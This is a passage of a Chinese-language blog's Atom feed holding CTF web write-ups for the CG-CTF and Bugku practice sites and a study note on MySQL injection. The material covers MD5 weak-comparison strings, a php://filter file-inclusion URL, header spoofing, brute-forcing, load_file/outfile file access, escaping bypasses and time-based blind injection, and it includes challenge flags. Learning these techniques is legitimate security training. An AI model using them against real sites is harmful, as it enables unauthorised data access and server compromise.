      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CG_ctf_writeup</title>
    <link href="https://wq371680537.github.io/2019/09/25/CG-ctf-writeup/"/>
    <id>https://wq371680537.github.io/2019/09/25/CG-ctf-writeup/</id>
    <published>2019-09-25T02:39:24.000Z</published>
    <updated>2019-09-28T03:45:31.384Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">题目连接</a></p><h3 id="一，签到题"><a href="#一，签到题" class="headerlink" title="一，签到题"></a>一，签到题</h3><a id="more"></a><p><img src="/2019/09/25/CG-ctf-writeup/web1_1.png" alt="web1_1"></p><p>右键检查元素找到flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web1_2.png" alt="web1_2"></p><h3 id="二，md5-collision"><a href="#二，md5-collision" class="headerlink" title="二，md5 collision"></a>二，md5 collision</h3><p><img src="/2019/09/25/CG-ctf-writeup/web2_1.png" alt="web2_1"></p><p>php<a href="https://blog.csdn.net/qq_41617034/article/details/92796769" target="_blank" rel="noopener">弱类型</a></p><p>== 比较时会把科学计数0E加一串数字看成0</p><p>QNKCDZO MD5 加密后为0e830400451993494058024219903391 即上面那种形式</p><p>只要找到这样形式的解密后的字符串就可以了</p><p>现成的有如下</p><p>QNKCDZO<br>0e830400451993494058024219903391</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s155964671a<br>0e342768416822451524974117254469</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s1091221200a<br>0e940624217856561557816327384675</p><p>s1885207154a<br>0e509367213418206700842008763514</p><p>带入其中一个得到flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web2_2.png" alt="web2_2"></p><h3 id="三，签到2"><a href="#三，签到2" class="headerlink" title="三，签到2"></a>三，签到2</h3><p>发现输入框不能把全部文字输入</p><p><img src="/2019/09/25/CG-ctf-writeup/web3_1.png" alt="web3_1"></p><p>右键检查元素更改输入长度再输入</p><p><img src="/2019/09/25/CG-ctf-writeup/web3_2.png" alt="web3_2"></p><p>得到flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web3_3.png" alt="web3_3"></p><h3 id="四，这题不是WEB"><a href="#四，这题不是WEB" class="headerlink" title="四，这题不是WEB"></a>四，这题不是WEB</h3><p>点进去有字有图片，检查元素没有结果</p><p><img src="/2019/09/25/CG-ctf-writeup/web4_1.png" alt="web4_1"></p><p>题目提示不是web，于是保存图片后用txt打开后搜索nctf得到flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web4_2.png" alt="web4_2"></p><h3 id="五，层层递进"><a href="#五，层层递进" class="headerlink" title="五，层层递进"></a>五，层层递进</h3><p>进去之后是一个网页</p><p>右键点击检查元素</p><p>web文件夹里面发现404.html点进去发现flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web5_1.png" alt="web5_1"></p><p>nctf{this_is_a_fl4g}</p><h3 id="六，AAencode"><a href="#六，AAencode" class="headerlink" title="六，AAencode"></a>六，AAencode</h3><p>打开是乱码用火狐打开更改编码方式</p><p><img src="/2019/09/25/CG-ctf-writeup/web6_1.png" alt="web6_1"></p><p>复制转码后的表情到控制台</p><p>我用的是IE浏览器的控制台</p><p><img src="/2019/09/25/CG-ctf-writeup/web6_2.png" alt="web6_2"></p><p>在页面上得到flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web6_3.png" alt="web6_3"></p><h3 id="七，单身二十年"><a href="#七，单身二十年" class="headerlink" title="七，单身二十年"></a>七，单身二十年</h3><p>题目说试试手速，即网页很快就跳走了</p><p><img src="/2019/09/25/CG-ctf-writeup/web7_1.png" alt="web7_1"></p><p>于是想到用Burp抓包就可以得到flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web7_2.png" alt="web7_2"></p><h3 id="八，php-decode"><a href="#八，php-decode" class="headerlink" title="八，php decode"></a>八，php decode</h3><p>发现一段php代码</p><p>贴到在线工具把eval改成echo就可以得到flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web8_1.png" alt="web8_1"></p><h3 id="九-文件包含"><a href="#九-文件包含" class="headerlink" title="九, 文件包含"></a>九, 文件包含</h3><p><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p><p>利用php伪协议进行做题</p><p>file=php://filter/read=convert.base64-encode/resource=index.php</p><p>对index.php源码进行编码</p><p>该网址得到一串base64码</p><p>解码得到源码下面有flag</p><p><img src="/2019/09/25/CG-ctf-writeup/web9_1.png" alt="web9_1"></p><p>nctf{edulcni_elif_lacol_si_siht}</p><h3 id="十，单身一百年也没用"><a href="#十，单身一百年也没用" class="headerlink" title="十，单身一百年也没用"></a>十，单身一百年也没用</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://cgctf.nuptsast.com/challenges#Web&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目连接&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;一，签到题&quot;&gt;&lt;a href=&quot;#一，签到题&quot; class=&quot;headerlink&quot; title=&quot;一，签到题&quot;&gt;&lt;/a&gt;一，签到题&lt;/h3&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BugkuCTF-WEB-WriteUp(持续更新)</title>
    <link href="https://wq371680537.github.io/2019/09/25/BugkuCTF-WEB-WriteUp-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>https://wq371680537.github.io/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/</id>
    <published>2019-09-25T02:30:16.000Z</published>
    <updated>2019-10-04T03:58:50.373Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1，web2"><a href="#1，web2" class="headerlink" title="1，web2"></a>1，web2</h3><a id="more"></a><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web1_1.png" alt="web1_1"></p><p>右键检查元素</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web1_2.png" alt="web1_2"></p><p>得到key KEY{Web-2-bugKssNNikls9100}</p><h3 id="2，计算器"><a href="#2，计算器" class="headerlink" title="2，计算器"></a>2，计算器</h3><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web2_1.png" alt="web2_1"></p><p>发现只能输入一位数</p><p>右键检查元素更改输入长度</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web2_2.png" alt="web2_2"></p><p>然后输入和得到keyflag{CTF-bugku-0032}</p><h3 id="3，web基础-GET"><a href="#3，web基础-GET" class="headerlink" title="3，web基础$_GET"></a>3，web基础$_GET</h3><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web3_1.png" alt="web3_1"></p><p>题目要用get传值构造</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web3_2.png" alt="web3_2"></p><p>得到flag flag{bugku_get_su8kej2en}</p><h3 id="4，web基础-POST"><a href="#4，web基础-POST" class="headerlink" title="4，web基础$_POST"></a>4，web基础$_POST</h3><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web4_1.png" alt="web4_1"></p><p>用火狐浏览器进行post</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web4_2.png" alt="web4_2"></p><p>得到flag flag{bugku_get_ssseint67se}</p><h3 id="5，矛盾"><a href="#5，矛盾" class="headerlink" title="5，矛盾"></a>5，矛盾</h3><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web5_1.png" alt="web5_1"></p><p>是数字又不是数字构造得到flag </p><p>flag{bugku-789-ps-ssdf}</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web5_2.png" alt="web5_2"></p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web5_3.png" alt="web5_3"></p><h3 id="6-web3"><a href="#6-web3" class="headerlink" title="6,web3"></a>6,web3</h3><p>打开网站一直弹窗右键检查元素得到</p><p>一串unicode码</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web6_1.png" alt="web6_1"></p><p>&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;</p><p>转ascii码得到</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web6_2.png" alt="web6_2"></p><p>KEY{J2sa42ahJK-HS11III}</p><h3 id="7，你必须让他停下"><a href="#7，你必须让他停下" class="headerlink" title="7，你必须让他停下"></a>7，你必须让他停下</h3><p>按进去网页一直跳来跳去</p><p>题目说要让他停下来于是</p><p>进行抓包得到flag</p><p>flag{dummy_game_1s_s0_popular}</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web7_1.png" alt="web7_1"></p><h3 id="8，变量1"><a href="#8，变量1" class="headerlink" title="8，变量1"></a>8，变量1</h3><p>与南邮解法一样</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web8_1.png" alt="web8_1"></p><h3 id="9，web5"><a href="#9，web5" class="headerlink" title="9，web5"></a>9，web5</h3><p>右键检查元素发现字符复制出来在控制台运行</p><p>得到flag</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web9_1.png" alt="web9_1"></p><p>CTF{WHATFK} 题目提示大写</p><h3 id="10，头等舱"><a href="#10，头等舱" class="headerlink" title="10，头等舱"></a>10，头等舱</h3><p>抓包得到flag</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web10_1.png" alt="web10_1"></p><p>flag{Bugku_k8_23s_istra}</p><h3 id="11，网站被黑"><a href="#11，网站被黑" class="headerlink" title="11，网站被黑"></a>11，网站被黑</h3><p>后台扫描得到两个200网址</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web11_1.png" alt="web11_1"></p><p>出现登录界面，随便输入密码进行抓包</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web11_2.png" alt="web11_2"></p><p>send to intruder add那个密码串</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web11_3.png" alt="web11_3"></p><p>选中自带密码进行抓包</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web11_4.png" alt="web11_4"></p><p>长度不一样的就是代码</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web11_5.png" alt="web11_5"></p><p>输入密码得到flag flag{hack_bug_ku035}</p><h3 id="12，管理员系统"><a href="#12，管理员系统" class="headerlink" title="12，管理员系统"></a>12，管理员系统</h3><p>右键检查元素得到一串base64码</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web12_1.png" alt="web12_1"></p><p>解密得到 test123</p><p>应该是密码，用户名用admin</p><p>登录提示用本地管理员登录</p><p>对他进行抓包</p><p>X-Forwarded-For: 127.0.0.1 伪装成本地ip</p><p>按go</p><p>得到flag 85ff2ee4171396724bae20c0bd851f6b</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web12_2.png" alt="web12_2"></p><h3 id="13，web4"><a href="#13，web4" class="headerlink" title="13，web4"></a>13，web4</h3><p>看看源码得到一串字符</p><p>unescape解密得到</p><script>var p1 = 'function checkSubmit(){var a=document.getElementById("password");if("undefined"!=typeof a){if("67d709b2b';var p2 = 'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1}}document.getElementById("levelQuest").onsubmit=checkSubmit;';eval(unescape(p1) + unescape('54aa2' + p2));</script><p>拼接得到67d709b2b54aa2aa648cf6e87a7114f1</p><p>输入得到flag  KEY{J22JK-HS11}</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web13_1.png" alt="web13_1"></p><h3 id="14，输入密码查看flag"><a href="#14，输入密码查看flag" class="headerlink" title="14，输入密码查看flag"></a>14，输入密码查看flag</h3><p>五位数密码，抓包进行爆破</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web14_1.png" alt="web14_1"></p><p>得到密码13579  输入得到flag</p><p>flag{bugku-baopo-hah}</p><h3 id="15，点击一百万次"><a href="#15，点击一百万次" class="headerlink" title="15，点击一百万次"></a>15，点击一百万次</h3><p>post传值右键检查元素</p><p>进行post传值 得到flag flag{Not_C00kI3Cl1ck3r}</p><p><img src="/2019/09/25/BugkuCTF-WEB-WriteUp-持续更新/web15_1.png" alt="web15_1"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1，web2&quot;&gt;&lt;a href=&quot;#1，web2&quot; class=&quot;headerlink&quot; title=&quot;1，web2&quot;&gt;&lt;/a&gt;1，web2&lt;/h3&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>代码审计</title>
    <link href="https://wq371680537.github.io/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/08/19/代码审计/</id>
    <published>2019-08-19T01:11:00.000Z</published>
    <updated>2019-09-28T02:07:12.500Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="代码审计" scheme="https://wq371680537.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php</title>
    <link href="https://wq371680537.github.io/2019/08/15/php/"/>
    <id>https://wq371680537.github.io/2019/08/15/php/</id>
    <published>2019-08-15T09:12:49.000Z</published>
    <updated>2019-09-26T08:49:07.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php基础"><a href="#php基础" class="headerlink" title="php基础"></a>php基础</h1><a id="more"></a><p>[TOC]</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;php基础&quot;&gt;&lt;a href=&quot;#php基础&quot; class=&quot;headerlink&quot; title=&quot;php基础&quot;&gt;&lt;/a&gt;php基础&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf基础入门</title>
    <link href="https://wq371680537.github.io/2019/04/04/ctf%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <id>https://wq371680537.github.io/2019/04/04/ctf基础入门/</id>
    <published>2019-04-04T07:51:01.000Z</published>
    <updated>2019-09-26T08:48:30.935Z</updated>
    
    <content type="html"><![CDATA[<h3 id="（1）信息收集"><a href="#（1）信息收集" class="headerlink" title="（1）信息收集"></a>（1）信息收集</h3><a id="more"></a><p><img src="/2019/04/04/ctf基础入门/信息收集1.png" alt="信息收集1"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;（1）信息收集&quot;&gt;&lt;a href=&quot;#（1）信息收集&quot; class=&quot;headerlink&quot; title=&quot;（1）信息收集&quot;&gt;&lt;/a&gt;（1）信息收集&lt;/h3&gt;
    
    </summary>
    
    
      <category term="-ctf入门" scheme="https://wq371680537.github.io/tags/ctf%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>mysql注入</title>
    <link href="https://wq371680537.github.io/2019/03/25/mysql%E6%B3%A8%E5%85%A5/"/>
    <id>https://wq371680537.github.io/2019/03/25/mysql注入/</id>
    <published>2019-03-25T13:23:47.000Z</published>
    <updated>2019-09-26T08:48:49.573Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="（1）sql注入原理"><a href="#（1）sql注入原理" class="headerlink" title="（1）sql注入原理"></a>（1）sql注入原理</h2><a id="more"></a><p><img src="/2019/03/25/mysql注入/sql注入原理.png" alt="sql注入原理"></p><h2 id="（2）常见的MySQL注入"><a href="#（2）常见的MySQL注入" class="headerlink" title="（2）常见的MySQL注入"></a>（2）常见的MySQL注入</h2><p>​        MySQL数据库<br>结构<br>​        数据库A=网站A<br>表名<br>​     列名<br>​           数据<br>​        数据库B=网站B<br>表名<br>​     列名<br>​           数据<br>​        数据库C=网站C<br>表名<br>​     列名<br>​           数据<br>获取字段数：order by x 取临界值<br>输入注意1<br>%20是空格的意识<br><img src="/2019/03/25/mysql注入/输入注意1.png" alt="输入注意1"><br>获取数据库名： database()<br>获取数据库版本：version()<br>各表名<br><img src="/2019/03/25/mysql注入/各表名.png" alt="各表名"></p><h2 id="（3）高权限文件插入注入"><a href="#（3）高权限文件插入注入" class="headerlink" title="（3）高权限文件插入注入"></a>（3）高权限文件插入注入</h2><p>数据用户：user()<br>操作系统：@@version_compile_os<br>Mysql 注入文件操作<br>不同用户数据库读取文件权限<br>文件读入： select load_file(‘文件路径’)<br>文件写入函数：select ‘内容’ into outfile ‘储存路径’<br><img src="/2019/03/25/mysql注入/文件读取1.png" alt="图片"><br>实际操作需要知道网站路径；<br>获取方法</p><ol><li><p>报错显示<br><img src="/2019/03/25/mysql注入/报错显示.png" alt="报错显示"> </p></li><li><p>谷歌黑客<br>网站带有warning关键字的<br>寻找该网站的错误信息如图<br>site:+该网站 空格 warning<br><img src="/2019/03/25/mysql注入/谷歌黑客1.png" alt="谷歌黑客"> </p></li><li><p>读取配置文件</p></li><li><p>漏洞报错</p></li><li><p>遗留文件<br>网址后面加/phpinfo.php<br><img src="/2019/03/25/mysql注入/遗留文件.png" alt="遗留文件"><br>里面有网站路径<br><img src="/2019/03/25/mysql注入/遗留文件之网站路径.png" alt="遗留文件之网站路径"> </p></li><li><p>字典猜解<br>注意：路径符号及编码斜杆可以/或\避免斜杆n</p><h2 id="（4）防护函数"><a href="#（4）防护函数" class="headerlink" title="（4）防护函数"></a>（4）防护函数</h2><p>魔术引号 magic_quotes_gpc 开关<br><img src="/2019/03/25/mysql注入/魔术密码.png" alt="魔术密码"><br> 安全函数 addslashes<br>注入时要单引号等会被转义<br>绕过思路<br>（1）编码绕过<br><img src="/2019/03/25/mysql注入/编码绕过.png" alt="编码绕过"><br>  (2)   宽字节注入</p><h2 id="（5）高权限跨库注入"><a href="#（5）高权限跨库注入" class="headerlink" title="（5）高权限跨库注入"></a>（5）高权限跨库注入</h2><p>跨库注入条件：root权限</p><p><img src="/2019/03/25/mysql注入/跨库输入2.png" alt="跨库输入2"></p><p><img src="/2019/03/25/mysql注入/获取数据库各表名1.png" alt="获取数据库各表名1"></p><p><img src="/2019/03/25/mysql注入/跨库输入3.png" alt="跨库输入3"></p><h2 id="（6）提交方式注入"><a href="#（6）提交方式注入" class="headerlink" title="（6）提交方式注入"></a>（6）提交方式注入</h2><p> <img src="/2019/03/25/mysql注入/文件提交1.png" alt="文件提交1"></p><p><img src="/2019/03/25/mysql注入/文件提交2.png" alt="文件提交2"></p><p>  1.GET ：?x=1</p><p>  2.POST登录注入</p><p>一般是登入框有</p><p><img src="/2019/03/25/mysql注入/文件提交3.png" alt="文件提交3"></p><p>单引post注入</p><p><img src="/2019/03/25/mysql注入/文件提交5.png" alt="文件提交5"></p><p>   3.COOLIE验证注入</p><p>抓包</p><p>  没有 Cookie:自己写一下</p><p><img src="/2019/03/25/mysql注入/文件提交4.png" alt="文件提交4"></p><h2 id="（7）-HTTP头部注入"><a href="#（7）-HTTP头部注入" class="headerlink" title="（7）.HTTP头部注入"></a>（7）.HTTP头部注入</h2><p>实际情况下，有部分站点接受数据是以数据包中的http头部进去数据</p><p>接受，所以测试注入点的时候，需要注入语句写到http头部中。</p><p><img src="/2019/03/25/mysql注入/HTTP头部注入1.png" alt="HTTP头部注入1"></p><p><img src="/2019/03/25/mysql注入/HTTP头部注入2.png" alt="HTTP头部注入2"></p><h2 id="（8）-参数类型注入"><a href="#（8）-参数类型注入" class="headerlink" title="（8）.参数类型注入"></a>（8）.参数类型注入</h2><p>数字，字符，搜索型</p><p><img src="/2019/03/25/mysql注入/参数类型注入1.png" alt="参数类型注入1"></p><p>字符型的注入例子</p><p>如果是字符型一般会存在单引号要考虑屏蔽</p><p>如果不考虑注入语句会被写入单引号内</p><p><img src="/2019/03/25/mysql注入/参数类型注入2.png" alt="参数类型注入2"></p><p>所以前面的单引号加另一半屏蔽后面的加#号屏蔽</p><p>%27为一个单引号%23为#号</p><p><img src="/2019/03/25/mysql注入/参数类型注入3.png" alt="参数类型注入3"></p><p>搜索型的注入例子</p><p><img src="/2019/03/25/mysql注入/参数类型注入4.png" alt="参数类型注入4"></p><h2 id="（9）参数加解密注入"><a href="#（9）参数加解密注入" class="headerlink" title="（9）参数加解密注入"></a>（9）参数加解密注入</h2><p>加解密注入</p><p>常见加密格式：</p><p>如果网站后面跟着这样的赋值要想到加密</p><p>如base加密</p><p><img src="/2019/03/25/mysql注入/加解密注入3.png" alt="加解密注入3"></p><p><img src="/2019/03/25/mysql注入/加解密注入1.png" alt="加解密注入1"></p><p><img src="/2019/03/25/mysql注入/加解密注入2.png" alt="加解密注入2"></p><h2 id="（10）盲注攻击-基于时间延迟注入（上）"><a href="#（10）盲注攻击-基于时间延迟注入（上）" class="headerlink" title="（10）盲注攻击-基于时间延迟注入（上）"></a>（10）盲注攻击-基于时间延迟注入（上）</h2><p>盲注与普通注入区别</p><p><img src="/2019/03/25/mysql注入/盲注1.png" alt="盲注1"></p><p>sleep()延迟作用</p><p>if(条件,true,false)如果条件为真返回第一个，假返回第二个</p><p>mid(str,截取的位数,第几个)截取</p><p>ord ascii编码</p><p>运用</p><p><img src="/2019/03/25/mysql注入/盲注2.png" alt="盲注2"></p><p>可以先知道他的位数</p><p><img src="/2019/03/25/mysql注入/盲注3.png" alt="盲注3"></p><h2 id="（11）盲注攻击-基于时间延迟注入（下）"><a href="#（11）盲注攻击-基于时间延迟注入（下）" class="headerlink" title="（11）盲注攻击-基于时间延迟注入（下）"></a>（11）盲注攻击-基于时间延迟注入（下）</h2><p>获取表名</p><p><img src="/2019/03/25/mysql注入/盲注4.png" alt="盲注4"></p><p>单个字的匹配</p><p>如用mid截取第一位的值判断</p><p><img src="/2019/03/25/mysql注入/盲注5.png" alt="盲注5"></p><p>用ascii码来代替字符</p><p><img src="/2019/03/25/mysql注入/盲注6.png" alt="盲注6"></p><h2 id="（12）Mysql-insert四种注入"><a href="#（12）Mysql-insert四种注入" class="headerlink" title="（12）Mysql_insert四种注入"></a>（12）Mysql_insert四种注入</h2><p>参考网站：</p><p>[]: <a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">https://websec.ca/kb/sql_injection</a>    “点击查看”</p><p><img src="/2019/03/25/mysql注入/insert1.png" alt="insert1"></p><p><img src="/2019/03/25/mysql注入/insert2.png" alt="insert2"></p><p><img src="/2019/03/25/mysql注入/insert4.png" alt="insert4"></p><p><img src="/2019/03/25/mysql注入/insert3.png" alt="insert3"></p><p><img src="/2019/03/25/mysql注入/insert5.png" alt="insert5"></p><h2 id="（13）Mysql-update四种注入"><a href="#（13）Mysql-update四种注入" class="headerlink" title="（13）Mysql_update四种注入"></a>（13）Mysql_update四种注入</h2><p><img src="/2019/03/25/mysql注入/update1.png" alt="update1"></p><h2 id="（14）Mysql-delete四种注入"><a href="#（14）Mysql-delete四种注入" class="headerlink" title="（14）Mysql_delete四种注入"></a>（14）Mysql_delete四种注入</h2><p><img src="/2019/03/25/mysql注入/delete1.png" alt="delete1"></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;（1）sql注入原理&quot;&gt;&lt;a href=&quot;#（1）sql注入原理&quot; class=&quot;headerlink&quot; title=&quot;（1）sql注入原理&quot;&gt;&lt;/a&gt;（1）sql注入原理&lt;/h2&gt;
    
    </summary>
    
    
      <category term="-ctf入门" scheme="https://wq371680537.github.io/tags/ctf%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
</feed>
